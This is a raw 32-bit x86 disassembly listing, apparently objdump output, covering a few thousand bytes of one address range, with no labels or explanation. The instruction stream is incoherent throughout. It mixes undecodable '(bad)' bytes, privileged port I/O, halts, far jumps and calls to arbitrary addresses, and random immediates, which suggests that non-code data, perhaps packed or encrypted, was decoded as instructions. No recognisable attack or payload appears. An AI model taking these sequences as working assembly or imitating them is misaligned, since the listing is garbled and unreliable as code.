  40d4fe:	mov    dh,0x2c
  40d500:	fnsave [eax-0x5c]
  40d503:	jmp    0x8553:0x5ebb04e5
  40d50a:	add    ah,BYTE PTR ds:0x82ce1c3b
  40d510:	add    bl,BYTE PTR [ecx]
  40d512:	dec    edi
  40d513:	pop    esi
  40d514:	jno    0x40d574
  40d516:	mov    DWORD PTR [eax-0x17a7328],eax
  40d51c:	stc    
  40d51d:	mov    ebp,0x82240073
  40d522:	in     al,dx
  40d523:	in     eax,0x10
  40d525:	push   eax
  40d526:	xchg   edx,eax
  40d527:	xchg   ecx,eax
  40d528:	bound  ebx,QWORD PTR [edx-0x39ae6baa]
  40d52e:	pop    edx
  40d52f:	fstp   DWORD PTR [esi-0x682482e9]
  40d535:	jnp    0x40d4f6
  40d537:	cmp    ecx,DWORD PTR [edx]
  40d539:	mov    ebx,DWORD PTR [ebx+0x2e92c5db]
  40d53f:	clc    
  40d540:	outs   dx,DWORD PTR ds:[esi]
  40d541:	sbb    ecx,ebx
  40d543:	rcl    ch,cl
  40d545:	sub    BYTE PTR [eax],0x68
  40d548:	popf   
  40d549:	xchg   ebx,eax
  40d54a:	jno    0x40d4f5
  40d54c:	mov    al,ds:0x3fd0ad14
  40d551:	pushf  
  40d552:	mov    edx,0x4a59202f
  40d557:	mov    dl,0x2c
  40d559:	imul   edi,DWORD PTR [edi+0x8],0x75
  40d55d:	imul   ebx,DWORD PTR [esi+0x2d2fa237],0x4e
  40d564:	push   0x16
  40d566:	sbb    DWORD PTR [eax-0x76896c30],esp
  40d56c:	mov    cl,0xd8
  40d56e:	out    dx,al
  40d56f:	ret    
  40d570:	xor    BYTE PTR [ecx],al
  40d572:	push   edx
  40d573:	add    BYTE PTR [ecx-0x27],bl
  40d576:	popa   
  40d577:	das    
  40d578:	leave  
  40d579:	call   0xe8091f17
  40d57e:	stos   DWORD PTR es:[edi],eax
  40d57f:	push   cs
  40d580:	push   ecx
  40d581:	mov    eax,0xc19980c4
  40d586:	jge    0x40d532
  40d588:	outs   dx,BYTE PTR ds:[esi]
  40d589:	(bad)  
  40d58a:	pop    ds
  40d58b:	nop
  40d58c:	arpl   WORD PTR [ebx],sp
  40d58e:	fcom   DWORD PTR [edx]
  40d590:	mov    ebx,0xd84bdda0
  40d595:	jbe    0x40d59a
  40d597:	call   0x76ed:0x5e475508
  40d59e:	xchg   edi,eax
  40d59f:	push   edi
  40d5a0:	adc    ebx,DWORD PTR [esi+0x13d048cb]
  40d5a6:	fisttp WORD PTR [esi+0x51502330]
  40d5ac:	adc    DWORD PTR [edx+0x3c],edx
  40d5af:	dec    esp
  40d5b0:	jb     0x40d5f5
  40d5b2:	lahf   
  40d5b3:	pop    edi
  40d5b4:	xlat   BYTE PTR ds:[ebx]
  40d5b5:	std    
  40d5b6:	fld    DWORD PTR [ebx]
  40d5b8:	mov    WORD PTR [ecx-0x631f1783],ss
  40d5be:	sbb    BYTE PTR [edi-0x78],dh
  40d5c1:	jmp    0x40d602
  40d5c3:	lahf   
  40d5c4:	sub    eax,0xe4eb029
  40d5c9:	fsubp  st(3),st
  40d5cb:	push   esp
  40d5cc:	or     eax,ebp
  40d5ce:	bound  esi,QWORD PTR ds:0x154ad81d
  40d5d4:	pushf  
  40d5d5:	arpl   WORD PTR [ecx],si
  40d5d7:	add    ch,dh
  40d5d9:	inc    ebx
  40d5da:	adc    al,0x50
  40d5dc:	cmp    al,0xf2
  40d5de:	push   ecx
  40d5df:	add    BYTE PTR [ebx+0x52b10249],al
  40d5e5:	das    
  40d5e6:	mov    bl,0xcf
  40d5e8:	repz call ebp
  40d5eb:	pop    ebx
  40d5ec:	hlt    
  40d5ed:	cli    
  40d5ee:	fs jno 0x40d5ed
  40d5f1:	xchg   edi,eax
  40d5f2:	out    dx,eax
  40d5f3:	cmp    dh,dl
  40d5f5:	por    mm4,QWORD PTR [edx]
  40d5f8:	dec    ebx
  40d5f9:	jo     0x40d5ef
  40d5fb:	inc    edx
  40d5fc:	div    cl
  40d5fe:	pop    ebp
  40d5ff:	rol    DWORD PTR [ebx+0x4c],cl
  40d602:	sub    BYTE PTR [esi-0x2ffb1af6],cl
  40d608:	cdq    
  40d609:	ss or  eax,0x70b7f7ef
  40d60f:	les    eax,FWORD PTR ds:0xb7ec44a2
  40d615:	push   esp
  40d616:	jae    0x40d659
  40d618:	push   ds
  40d619:	mov    edx,DWORD PTR [esi+edi*1-0x48a52978]
  40d620:	xchg   ecx,eax
  40d621:	dec    esp
  40d622:	(bad)  
  40d623:	fnstsw WORD PTR [eax-0x63]
  40d626:	(bad)  
  40d627:	mov    bh,0xeb
  40d629:	xor    eax,0xb7180b54
  40d62e:	test   BYTE PTR [ecx+eiz*1],0xbe
  40d632:	and    eax,0xce93f94e
  40d637:	or     DWORD PTR [ecx-0x78],eax
  40d63a:	xor    eax,0x22095a0b
  40d63f:	pop    edi
  40d640:	pop    edi
  40d641:	mov    ecx,0xca9a9ff7
  40d646:	mov    BYTE PTR [ebp-0x6ab84187],dh
  40d64c:	inc    ecx
  40d64d:	inc    edx
  40d64e:	push   ebx
  40d64f:	mov    dh,0xf6
  40d651:	mov    ds:0x79da7b5b,eax
  40d656:	jge    0x40d677
  40d658:	(bad)  
  40d659:	xchg   ebx,eax
  40d65a:	xor    cl,ch
  40d65c:	lock loope 0x40d6ae
  40d65f:	test   al,0xe7
  40d661:	and    eax,0xc8447fdc
  40d666:	xchg   edx,eax
  40d667:	push   esp
  40d668:	iret   
  40d669:	frstor [ebp-0x53]
  40d66c:	xchg   eax,ebx
  40d66e:	mov    DWORD PTR [ebx-0x1aa95b3c],edx
  40d674:	fcmovne st,st(3)
  40d676:	shl    BYTE PTR [esi],0x56
  40d679:	fisttp QWORD PTR [ebx+edx*8]
  40d67c:	mov    ecx,0xace58579
  40d681:	jae    0x40d6df
  40d683:	les    ebp,FWORD PTR [edi]
  40d685:	leave  
  40d686:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d687:	in     al,dx
  40d688:	xchg   ebp,eax
  40d689:	mov    dl,0xd9
  40d68b:	sti    
  40d68c:	cwde   
  40d68d:	cs mov edi,0xeb03d177
  40d693:	retf   0xdcf2
  40d696:	outs   dx,BYTE PTR ds:[esi]
  40d697:	js     0x40d706
  40d699:	adc    DWORD PTR [edx+0x1],eax
  40d69c:	push   ecx
  40d69d:	int    0x80
  40d69f:	in     eax,0x98
  40d6a1:	scas   eax,DWORD PTR es:[edi]
  40d6a2:	rcr    DWORD PTR [ebx],1
  40d6a4:	pop    eax
  40d6a5:	add    eax,0x54143bad
  40d6aa:	nop
  40d6ab:	mov    dh,0xaf
  40d6ad:	fsub   QWORD PTR [edi-0x18]
  40d6b0:	inc    ecx
  40d6b1:	pop    ecx
  40d6b2:	mov    eax,0x87167d70
  40d6b7:	cmp    al,BYTE PTR [edi-0x2d5acd3a]
  40d6bd:	sub    ebp,DWORD PTR [esi]
  40d6bf:	(bad)  
  40d6c0:	int    0x53
  40d6c2:	rcl    DWORD PTR [edx-0x2b774f3e],0xe0
  40d6c9:	mul    BYTE PTR [ebx]
  40d6cb:	ret    0x4ca4
  40d6ce:	mov    esp,0x967bd714
  40d6d3:	adc    al,0x2a
  40d6d5:	pop    ecx
  40d6d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6d7:	ss stc 
  40d6d9:	push   es
  40d6da:	xor    eax,0xb50081bd
  40d6df:	test   eax,0x3c7f15f
  40d6e4:	test   al,0x72
  40d6e6:	push   ss
  40d6e7:	pushf  
  40d6e8:	call   0xb5af8c5f
  40d6ed:	sub    dh,BYTE PTR [ebx+0x64]
  40d6f0:	inc    esp
  40d6f1:	fs push edx
  40d6f3:	cmp    eax,0x48689229
  40d6f8:	(bad)  
  40d6f9:	mov    ch,0x22
  40d6fb:	out    dx,al
  40d6fc:	(bad)  
  40d6fe:	iret   
  40d6ff:	rcl    BYTE PTR [edi],1
  40d701:	xor    ah,BYTE PTR [ecx+0x61]
  40d704:	std    
  40d705:	mov    ss,WORD PTR [edx+0x71]
  40d708:	inc    edx
  40d709:	mov    dl,0xad
  40d70b:	jl     0x40d6f5
  40d70d:	test   eax,0x3ff3dd20
  40d713:	jnp    0x40d6c7
  40d715:	push   eax
  40d716:	push   ebp
  40d717:	xchg   edi,eax
  40d718:	pop    ecx
  40d719:	inc    ebx
  40d71a:	sar    dh,1
  40d71c:	jge    0x40d729
  40d71e:	nop
  40d71f:	cdq    
  40d720:	inc    edx
  40d721:	sahf   
  40d722:	cs icebp 
  40d724:	cs and dh,ch
  40d727:	iret   
  40d728:	repz sub esi,0x2f6b80c9
  40d72f:	jg     0x40d72b
  40d731:	fs pop esi
  40d733:	push   eax
  40d734:	gs (bad) 
  40d736:	popf   
  40d737:	xor    DWORD PTR [edx-0x5a],esp
  40d73a:	xchg   ecx,eax
  40d73b:	pop    esp
  40d73c:	pop    eax
  40d73d:	shl    DWORD PTR [edi-0x41],0x95
  40d741:	pop    ecx
  40d742:	shr    edx,1
  40d744:	push   0xffffffeb
  40d746:	sbb    edx,DWORD PTR [eax-0x48725cd8]
  40d74c:	mov    ds:0xc44129e3,eax
  40d751:	imul   DWORD PTR [ecx-0x6f77b60e]
  40d757:	mov    ah,0x2a
  40d759:	jg     0x40d734
  40d75b:	retf   0x4a6
  40d75e:	inc    edx
  40d75f:	not    DWORD PTR [esp+ebx*2-0x57aa0ba5]
  40d766:	les    esp,FWORD PTR [ecx]
  40d768:	pop    ebx
  40d769:	or     al,BYTE PTR [ebp-0x1e085450]
  40d76f:	ss or  bl,BYTE PTR es:[ebp+0x1ad857d7]
  40d777:	adc    cl,BYTE PTR [ebx]
  40d779:	sbb    eax,0x122d27a1
  40d77e:	popf   
  40d77f:	inc    esp
  40d780:	cmp    DWORD PTR [ebp+0x266e917b],esp
  40d786:	push   eax
  40d787:	sub    DWORD PTR [ebp+0x48],0xeb996ca3
  40d78e:	xor    eax,0x7b22281a
  40d793:	cli    
  40d794:	dec    edi
  40d795:	sub    ch,ch
  40d797:	ins    BYTE PTR es:[edi],dx
  40d798:	scas   eax,DWORD PTR es:[edi]
  40d799:	push   ebp
  40d79a:	out    0xe2,al
  40d79c:	sbb    DWORD PTR ss:[edx+0x366cf577],esp
  40d7a3:	packuswb mm2,QWORD PTR [edx]
  40d7a6:	loope  0x40d827
  40d7a8:	adc    al,0x81
  40d7aa:	pop    esi
  40d7ab:	adc    DWORD PTR [edx+edx*1-0x58],eax
  40d7af:	call   0x3aad38bf
  40d7b4:	inc    eax
  40d7b5:	sahf   
  40d7b6:	or     ecx,DWORD PTR [ebp+0x7b]
  40d7b9:	jle    0x40d82f
  40d7bb:	and    DWORD PTR [edx],eax
  40d7bd:	mov    esp,DWORD PTR [esi]
  40d7bf:	js     0x40d74b
  40d7c1:	xor    dl,BYTE PTR [esi]
  40d7c3:	pusha  
  40d7c4:	aas    
  40d7c5:	jg     0x40d820
  40d7c7:	lahf   
  40d7c8:	inc    ebp
  40d7c9:	hlt    
  40d7ca:	fild   WORD PTR [eax-0x31]
  40d7cd:	rcr    BYTE PTR [eax+0x39b12c30],cl
  40d7d3:	imul   edx,DWORD PTR [esi+ebp*4],0x91a8774a
  40d7da:	xor    bh,dl
  40d7dc:	out    0x55,al
  40d7de:	sbb    eax,DWORD PTR [ecx+0x77f4c99c]
  40d7e4:	cs test ebx,ecx
  40d7e7:	fucom  st(2)
  40d7e9:	stos   BYTE PTR es:[edi],al
  40d7ea:	out    0xfb,al
  40d7ec:	or     eax,0x38f786d9
  40d7f1:	jl     0x40d7d7
  40d7f3:	jns    0x40d872
  40d7f5:	test   bl,al
  40d7f7:	xchg   edi,eax
  40d7f8:	(bad)  
  40d7f9:	mov    eax,0xa676f59c
  40d7fe:	xchg   edi,eax
  40d7ff:	mov    eax,ds:0x882f9591
  40d804:	cs jp  0x40d882
  40d807:	mov    bl,0xaa
  40d809:	fbstp  TBYTE PTR [ebx-0x70fcd6ca]
  40d80f:	and    eax,0x898a9e1e
  40d814:	cs push esp
  40d816:	inc    esi
  40d817:	inc    ecx
  40d818:	inc    ebx
  40d819:	aam    0xea
  40d81b:	js     0x40d7fd
  40d81d:	or     eax,0x489a5041
  40d822:	add    cl,BYTE PTR [ecx+0x7e]
  40d825:	cmp    al,dh
  40d827:	sbb    edi,DWORD PTR [edi+0x5d]
  40d82a:	mov    eax,0x4c7081a1
  40d82f:	aam    0x8e
  40d831:	or     BYTE PTR [edx+esi*8-0x1e8a525],0x4b
  40d839:	adc    BYTE PTR [edx+edi*1-0x75],al
  40d83d:	dec    edi
  40d83e:	push   ds
  40d83f:	pop    ss
  40d840:	push   eax
  40d841:	lock das 
  40d843:	cmp    ecx,ebx
  40d845:	xchg   BYTE PTR [ebp+0xf],bh
  40d848:	fiadd  WORD PTR [edx-0x64fed08f]
  40d84e:	jmp    0x79438d0c
  40d853:	shl    BYTE PTR [edi],cl
  40d855:	rcl    BYTE PTR [edi],cl
  40d857:	ret    
  40d858:	pop    edi
  40d859:	push   eax
  40d85a:	aas    
  40d85b:	jle    0x40d850
  40d85d:	retf   0xcd6d
  40d860:	sub    DWORD PTR ds:0x8adf082f,edx
  40d866:	mov    al,0x25
  40d868:	(bad)  [edi-0x56]
  40d86b:	mov    eax,0xd91a1375
  40d870:	jge    0x40d7f8
  40d872:	or     al,0xc4
  40d874:	das    
  40d875:	pop    edx
  40d876:	add    al,0xf7
  40d878:	mov    dl,0x32
  40d87a:	in     al,0x28
  40d87c:	mov    esi,0x738f0e17
  40d881:	ins    BYTE PTR es:[edi],dx
  40d882:	pop    eax
  40d883:	repz mov al,0xe0
  40d886:	iret   
  40d887:	mov    al,BYTE PTR ds:0x478b8022
  40d88d:	push   ds
  40d88e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d88f:	mov    dh,BYTE PTR [edx-0x12528403]
  40d895:	push   esi
  40d896:	mov    esp,0xbccbbd01
  40d89b:	xor    al,0xfd
  40d89d:	iret   
  40d89e:	clc    
  40d89f:	mov    al,ds:0xea227e06
  40d8a4:	xor    eax,0xca89fb80
  40d8a9:	mov    eax,0x6b73ad3e
  40d8ae:	std    
  40d8af:	adc    BYTE PTR [esi+0x19],dh
  40d8b2:	xchg   ebp,eax
  40d8b3:	int    0x4a
  40d8b5:	aas    
  40d8b6:	neg    BYTE PTR [edx-0x51]
  40d8b9:	cmp    al,0x23
  40d8bb:	xor    al,0x15
  40d8bd:	repz xor ebx,eax
  40d8c0:	inc    edx
  40d8c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8c2:	mov    esp,0xc52d9766
  40d8c7:	adc    ebp,DWORD PTR [ebx+0x4801c83c]
  40d8cd:	mov    ebx,0xccaa7a48
  40d8d2:	jo     0x40d887
  40d8d4:	sbb    eax,DWORD PTR [edx-0x47]
  40d8d7:	and    DWORD PTR [ecx*2+0x3cf4a165],0xd4a5d6b1
  40d8e2:	jg     0x40d87f
  40d8e4:	aad    0xfc
  40d8e6:	sar    BYTE PTR [edx+0x39977a77],1
  40d8ec:	push   0x6f
  40d8ee:	and    BYTE PTR [edx],bl
  40d8f0:	icebp  
  40d8f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8f2:	push   ecx
  40d8f3:	fmul   DWORD PTR [edx-0x21]
  40d8f6:	stos   BYTE PTR es:[edi],al
  40d8f7:	add    eax,0x79b5f153
  40d8fc:	mov    ah,0x5c
  40d8fe:	ds inc edx
  40d900:	mov    dh,0xdc
  40d902:	xor    BYTE PTR [edx],cl
  40d904:	loope  0x40d91e
  40d906:	std    
  40d907:	jl     0x40d951
  40d909:	cs dec esp
  40d90b:	popf   
  40d90c:	aam    0x5e
  40d90e:	lock cmp eax,0x9a81249
  40d914:	jle    0x40d978
  40d916:	dec    ecx
  40d917:	daa    
  40d918:	push   es
  40d919:	mov    ecx,0xf4224f31
  40d91e:	mov    dh,0xac
  40d920:	push   0xffffffbc
  40d922:	ss std 
  40d924:	clc    
  40d925:	imul   esp,DWORD PTR [ebx+edx*8+0x3f8254f8],0x7554e8bb
  40d930:	outs   dx,DWORD PTR ds:[esi]
  40d931:	jb     0x40d8db
  40d933:	cmp    dl,BYTE PTR [edx+eiz*2]
  40d936:	inc    eax
  40d937:	div    BYTE PTR [ebx-0x54]
  40d93a:	shr    BYTE PTR [ecx+0x39f7e503],cl
  40d940:	push   0x72152162
  40d945:	adc    DWORD PTR [edi],ecx
  40d947:	enter  0xc486,0xf3
  40d94b:	mov    ds:0x7a38c91c,eax
  40d950:	adc    eax,DWORD PTR [eax]
  40d952:	xchg   ebp,eax
  40d953:	xor    edi,DWORD PTR [eax]
  40d955:	clc    
  40d956:	daa    
  40d957:	int    0x36
  40d959:	mov    bl,BYTE PTR [ebp+0x3f]
  40d95c:	mov    bh,ah
  40d95e:	repz and al,0xbc
  40d961:	pop    ebp
  40d962:	jo     0x40d915
  40d964:	jns    0x40d9ad
  40d966:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d967:	test   al,0x7d
  40d969:	ds fdivr st(0),st
  40d96c:	mov    edx,0xe774f6ca
  40d971:	xor    dh,BYTE PTR [edi+0x2ce9c1e9]
  40d977:	jne    0x40d9b0
  40d979:	fld    DWORD PTR [ebp+0x4c95c2c6]
  40d97f:	or     BYTE PTR [edi],0x26
  40d982:	mov    cl,0xf5
  40d984:	xor    bh,ah
  40d986:	mov    BYTE PTR [ecx+esi*4],bl
  40d989:	xor    DWORD PTR [ebx-0x8c02d54],esp
  40d98f:	outs   dx,BYTE PTR ds:[esi]
  40d990:	fadd   DWORD PTR [edi]
  40d992:	fmul   st,st(7)
  40d994:	(bad)  
  40d996:	cld    
  40d997:	outs   dx,DWORD PTR ds:[esi]
  40d998:	inc    esi
  40d999:	dec    esi
  40d99a:	mov    edx,DWORD PTR [eax+0xec89ef0]
  40d9a0:	daa    
  40d9a1:	iret   
  40d9a2:	sub    esp,DWORD PTR ds:0x54ad8e14
  40d9a8:	in     eax,0x78
  40d9aa:	adc    dl,bh
  40d9ac:	hlt    
  40d9ad:	nop
  40d9ae:	cmp    BYTE PTR [ebx+0x7],al
  40d9b1:	jnp    0x40d95c
  40d9b3:	dec    eax
  40d9b4:	(bad)  
  40d9b5:	push   esp
  40d9b6:	or     bh,al
  40d9b8:	xor    BYTE PTR [esp+eax*4],0x9b
  40d9bc:	jmp    0xf7fbbd92
  40d9c1:	enter  0x763a,0x28
  40d9c5:	mov    edx,0x410db86f
  40d9cb:	call   0x28359feb
  40d9d0:	aad    0x76
  40d9d2:	jg     0x40d965
  40d9d4:	push   ecx
  40d9d5:	pop    ss
  40d9d6:	dec    edx
  40d9d7:	imul   ebp,DWORD PTR [esi],0xffffff8b
  40d9da:	cmp    esp,esi
  40d9dc:	mov    WORD PTR [esi+0x2e],cs
  40d9df:	sahf   
  40d9e0:	mov    BYTE PTR [esi+0x3fb7c0af],bh
  40d9e6:	iret   
  40d9e7:	and    DWORD PTR [edi],ebp
  40d9e9:	call   0x5a35:0xe9c14bd8
  40d9f0:	rcr    BYTE PTR [eax],cl
  40d9f2:	das    
  40d9f3:	test   al,0x16
  40d9f5:	je     0x40d9af
  40d9f7:	popf   
  40d9f8:	stos   DWORD PTR es:[edi],eax
  40d9f9:	mov    al,0xee
  40d9fb:	fwait
  40d9fc:	mov    al,0x7
  40d9fe:	add    bl,BYTE PTR [esi+0x667907ef]
  40da04:	mov    ds:0x71f91d35,al
  40da09:	out    dx,al
  40da0a:	jb     0x40d992
  40da0c:	jne    0x40da48
  40da0e:	dec    esp
  40da0f:	loope  0x40da4a
  40da11:	aam    0x62
  40da13:	mul    al
  40da15:	cld    
  40da16:	bound  esp,QWORD PTR ds:0xf8509855
  40da1c:	xor    ch,cl
  40da1e:	inc    eax
  40da1f:	push   ss
  40da20:	dec    esi
  40da21:	cmp    eax,0xfe359e42
  40da26:	jle    0x40da00
  40da28:	ds clc 
  40da2a:	inc    esp
  40da2b:	loope  0x40da56
  40da2d:	into   
  40da2e:	mov    esi,0xfd81d170
  40da33:	push   ss
  40da34:	sbb    eax,0x1b02c2f6
  40da39:	outs   dx,BYTE PTR ds:[esi]
  40da3a:	lock sar BYTE PTR [ecx],0x32
  40da3e:	out    0xe9,eax
  40da40:	(bad)  
  40da41:	(bad)  
  40da42:	xor    al,0x3d
  40da44:	fild   QWORD PTR [eax]
  40da46:	imul   eax,DWORD PTR [esi+0xe],0x71
  40da4a:	fld    DWORD PTR [esi]
  40da4c:	out    0x6e,eax
  40da4e:	xor    al,0x91
  40da50:	std    
  40da51:	sbb    BYTE PTR [ebp-0x668ac199],bl
  40da57:	imul   esi,DWORD PTR [eax+0x35],0x4d86dcd6
  40da5e:	dec    esi
  40da5f:	adc    ch,dh
  40da61:	inc    ebp
  40da62:	push   eax
  40da63:	(bad)  
  40da64:	xlat   BYTE PTR ds:[ebx]
  40da65:	push   esp
  40da66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da67:	clc    
  40da68:	inc    ebp
  40da69:	jo     0x40da6d
  40da6b:	adc    dl,ch
  40da6d:	call   DWORD PTR [eax-0x66]
  40da70:	test   al,0x96
  40da72:	jecxz  0x40dab9
  40da74:	outs   dx,BYTE PTR ds:[esi]
  40da75:	lahf   
  40da76:	dec    edx
  40da77:	dec    edi
  40da78:	or     eax,0x6f3e59a0
  40da7d:	push   eax
  40da7e:	or     eax,0xa70ec318
  40da83:	fadd   DWORD PTR [eax-0x42]
  40da86:	jae    0x40da62
  40da88:	jmp    0x40da9e
  40da8a:	pop    esp
  40da8b:	mov    bl,cl
  40da8d:	stc    
  40da8e:	jne    0x40dafc
  40da90:	outs   dx,BYTE PTR ds:[esi]
  40da91:	push   ss
  40da92:	jae    0x40da44
  40da94:	dec    ebx
  40da95:	push   cs
  40da96:	test   BYTE PTR [esi+edx*1-0x43],ch
  40da9a:	repnz xchg ebx,eax
  40da9c:	clc    
  40da9d:	dec    ecx
  40da9e:	sbb    edi,eax
  40daa0:	daa    
  40daa1:	cdq    
  40daa2:	es xchg dl,al
  40daa5:	xor    al,0x86
  40daa7:	pop    ss
  40daa8:	lahf   
  40daa9:	ret    
  40daaa:	(bad)  
  40daab:	cmp    al,0xa8
  40daad:	pop    ss
  40daae:	fmul   QWORD PTR [esi+0x6caa2764]
  40dab4:	xor    ah,cl
  40dab6:	mov    edi,0xb8004561
  40dabb:	out    dx,al
  40dabc:	fst    DWORD PTR [ecx]
  40dabe:	out    0x36,eax
  40dac0:	mov    eax,ds:0x1b54d942
  40dac5:	push   es
  40dac6:	jp     0x40da6f
  40dac8:	add    eax,0x2c458e0d
  40dacd:	jge    0x40daaa
  40dacf:	cld    
  40dad0:	xchg   ebp,eax
  40dad1:	cli    
  40dad2:	push   edx
  40dad3:	in     eax,dx
  40dad4:	jg     0x40daaa
  40dad6:	push   ds
  40dad7:	js     0x2d8537f4
  40dadd:	retf   0xf631
  40dae0:	repz in eax,0x3
  40dae3:	xor    eax,ebx
  40dae5:	das    
  40dae6:	lahf   
  40dae7:	(bad)  
  40dae9:	ja     0x40db32
  40daeb:	rol    BYTE PTR [ecx-0x13646487],0xb5
  40daf2:	repnz ss sub eax,0x4ad690d7
  40daf9:	test   ch,cl
  40dafb:	mov    ds:0x5e42a29a,eax
  40db00:	les    ecx,FWORD PTR [edx]
  40db02:	mov    DWORD PTR [ebx],ecx
  40db04:	fwait
  40db05:	std    
  40db06:	and    bl,BYTE PTR [esi+edx*1-0x1]
  40db0a:	js     0x40db30
  40db0c:	lods   eax,DWORD PTR ds:[esi]
  40db0d:	test   eax,0x7125cb4c
  40db12:	ins    DWORD PTR es:[edi],dx
  40db13:	gs call 0x8dac2009
  40db19:	ins    BYTE PTR es:[edi],dx
  40db1a:	inc    ebp
  40db1b:	or     DWORD PTR [eax-0x61],ebx
  40db1e:	ficom  WORD PTR [esi+0x4a97b6c0]
  40db24:	mov    dl,0x60
  40db26:	out    0x90,eax
  40db28:	cld    
  40db29:	loope  0x40db6a
  40db2b:	mov    ebx,0x8ca2c533
  40db30:	inc    edx
  40db31:	pop    esi
  40db32:	jp     0x40db63
  40db34:	push   esp
  40db35:	cld    
  40db36:	xchg   BYTE PTR [eax],ch
  40db38:	cli    
  40db39:	sbb    edx,DWORD PTR [edx]
  40db3b:	sbb    DWORD PTR [edi-0x13],ebp
  40db3e:	jae    0x40db10
  40db40:	ja     0x40dbbd
  40db42:	sar    BYTE PTR [ecx+0x36],cl
  40db45:	mov    al,BYTE PTR [ecx]
  40db47:	cmp    BYTE PTR [ebx-0x2585c7d4],0xea
  40db4e:	xor    bh,BYTE PTR [edx]
  40db50:	sahf   
  40db51:	adc    al,dl
  40db53:	test   DWORD PTR [edx-0x49a261f7],ebx
  40db59:	pop    edx
  40db5a:	cmp    BYTE PTR [ebx-0x36a96416],ah
  40db60:	pop    ebp
  40db61:	mov    cl,0xf9
  40db63:	ja     0x40db7b
  40db65:	dec    esp
  40db66:	inc    edx
  40db67:	out    dx,eax
  40db68:	adc    al,0x21
  40db6a:	ja     0x40dbe8
  40db6c:	mov    ecx,0x118eb096
  40db71:	in     al,dx
  40db72:	cmp    eax,0x263706a5
  40db77:	sar    BYTE PTR [ebp+0x7c],0x97
  40db7b:	dec    edx
  40db7c:	sar    DWORD PTR ds:0xa8fd36e1,cl
  40db82:	or     ebp,edi
  40db84:	mov    esi,0x70d13673
  40db89:	inc    ecx
  40db8a:	add    al,0x36
  40db8c:	push   ebx
  40db8d:	imul   edi,ebx,0x5c6557df
  40db93:	fcomp  st(4)
  40db95:	jo     0x40dbc2
  40db97:	jle    0x40db6b
  40db99:	lds    ebp,FWORD PTR [ecx-0x62]
  40db9c:	jbe    0x40dc15
  40db9e:	adc    al,0x86
  40dba0:	mov    ch,0x5e
  40dba2:	xchg   DWORD PTR [esi],edi
  40dba4:	iret   
  40dba5:	mov    ecx,0x354a248e
  40dbaa:	jg     0x40dc18
  40dbac:	cli    
  40dbad:	adc    eax,0x21e6fb37
  40dbb2:	sub    ecx,DWORD PTR [esi+0x30d8e497]
  40dbb8:	sbb    eax,0x15e9970d
  40dbbd:	stc    
  40dbbe:	jge    0x40db72
  40dbc0:	jmp    DWORD PTR [esi-0x54c6f2ab]
  40dbc6:	xchg   ebx,eax
  40dbc7:	int3   
  40dbc8:	mov    eax,ds:0x29994136
  40dbcd:	pop    esp
  40dbce:	cdq    
  40dbcf:	cwde   
  40dbd0:	mov    ebx,0x37885361
  40dbd5:	ret    
  40dbd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbd7:	add    ah,BYTE PTR [ecx+0x4ed3b0f3]
  40dbdd:	or     ecx,esi
  40dbdf:	sbb    DWORD PTR [ebx+0x6],edi
  40dbe2:	jg     0x40dbb1
  40dbe4:	mov    ecx,0x7887536d
  40dbe9:	xchg   ebp,eax
  40dbea:	xchg   esi,eax
  40dbeb:	inc    edx
  40dbec:	enter  0x6da0,0x94
  40dbf0:	sbb    ebx,0x4e
  40dbf3:	mov    ch,0x92
  40dbf5:	retf   
  40dbf6:	rcl    DWORD PTR ds:0x190a165a,1
  40dbfc:	out    dx,al
  40dbfd:	push   edx
  40dbfe:	push   edi
  40dbff:	push   ss
  40dc00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc01:	rcr    DWORD PTR fs:[edx+ecx*4-0x11c55037],1
  40dc09:	xchg   ecx,eax
  40dc0a:	ret    0x1c43
  40dc0d:	imul   edx
  40dc0f:	bnd jge 0x40dc5d
  40dc12:	pop    ebp
  40dc13:	mov    esi,0x84c41d67
  40dc18:	xlat   BYTE PTR ds:[ebx]
  40dc19:	les    edi,FWORD PTR [edx-0x9]
  40dc1c:	jmp    FWORD PTR [edx]
  40dc1e:	mov    ebx,0xb15f3352
  40dc23:	sub    BYTE PTR [edi-0x74f312dd],0x1d
  40dc2a:	ja     0x40dc32
  40dc2c:	(bad)  
  40dc2d:	fist   WORD PTR [eax-0x6d4c4435]
  40dc33:	sbb    DWORD PTR [esi-0x37],esp
  40dc36:	push   es
  40dc37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc38:	dec    esi
  40dc39:	xchg   edx,eax
  40dc3a:	inc    ebp
  40dc3b:	arpl   WORD PTR [ebx],di
  40dc3d:	(bad)  
  40dc3f:	sbb    al,0x9d
  40dc41:	sbb    eax,0xa0ebd913
  40dc46:	add    esi,DWORD PTR [edx-0xea15aa3]
  40dc4c:	popa   
  40dc4d:	pop    ss
  40dc4e:	dec    ebx
  40dc4f:	cmp    bl,bl
  40dc51:	dec    ebx
  40dc52:	add    ah,bh
  40dc54:	sub    bl,bl
  40dc56:	mov    ds:0x964f21ea,al
  40dc5b:	sbb    eax,0x47817074
  40dc60:	scas   eax,DWORD PTR es:[edi]
  40dc61:	mov    eax,ds:0xd65cf13
  40dc66:	add    DWORD PTR [edx+0x1628d32b],ebp
  40dc6c:	ja     0x40dc08
  40dc6e:	mov    esp,0x93520891
  40dc73:	fsub   QWORD PTR [edx]
  40dc75:	xor    eax,0xb6b7c4cb
  40dc7a:	mov    ds:0xe9ebf766,eax
  40dc7f:	inc    esi
  40dc80:	sti    
  40dc81:	rcl    BYTE PTR [edx],1
  40dc83:	(bad)  
  40dc84:	retf   
  40dc85:	(bad)  
  40dc86:	lods   eax,DWORD PTR ds:[esi]
  40dc87:	loope  0x40dc14
  40dc89:	int    0x31
  40dc8b:	ss sahf 
  40dc8d:	and    DWORD PTR ds:0x962f10ab,0xffffff8c
  40dc94:	xchg   edi,eax
  40dc95:	xor    esi,ebx
  40dc97:	jo     0x40dcfa
  40dc99:	xchg   esi,eax
  40dc9a:	or     DWORD PTR [ecx-0x69],edx
